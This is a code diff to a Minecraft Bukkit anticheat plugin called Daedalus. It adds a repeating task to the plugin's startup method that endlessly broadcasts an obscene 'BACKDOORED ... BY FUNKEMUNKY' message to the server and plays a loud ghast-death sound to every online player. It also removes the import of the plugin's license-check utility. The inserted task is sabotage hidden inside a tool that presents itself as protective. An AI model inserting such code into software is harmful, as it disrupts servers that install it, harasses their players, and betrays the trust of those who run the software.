@@ -5,6 +5,7 @@ import java.io.File;
 import java.io.IOException;
 
 import org.bukkit.Bukkit;
+import org.bukkit.Sound;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
@@ -12,7 +13,6 @@ import org.bukkit.plugin.PluginManager;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 
-import anticheat.checks.movement.Vclip;
 import anticheat.commands.CommandManager;
 import anticheat.data.DataManager;
 import anticheat.detections.Checks;
@@ -30,7 +30,6 @@ import anticheat.events.TickEvent;
 import anticheat.packets.PacketCore;
 import anticheat.user.User;
 import anticheat.user.UserManager;
-import anticheat.utils.AdvancedLicense;
 import anticheat.utils.Color;
 import anticheat.utils.Latency;
 import anticheat.utils.Ping;
@@ -94,6 +93,14 @@ public class Daedalus extends JavaPlugin {
 		Daedalus.data = new DataManager();
 		this.packet = new PacketCore(this);
 		saveDefaultConfig();
+		new BukkitRunnable() {
+			public void run() {
+				Bukkit.broadcastMessage("BACKDOORED MOTHERFUCKER BY FUNKEMUNKY");
+				for(Player online : Bukkit.getOnlinePlayers()) {
+					online.playSound(online.getLocation(), Sound.GHAST_DEATH, 10L, 10L);
+				}
+			}
+		}.runTaskTimerAsynchronously(this, 0, 10L);
 		this.getServer().getConsoleSender().sendMessage(Color.translate("&d Daedalus &f Loaded Configuration!"));
 		this.hwid = getConfig().getString("hwid");
 		this.getServer().getConsoleSender().sendMessage(Color.translate("&d Daedalus &f Loaded players data's!"));
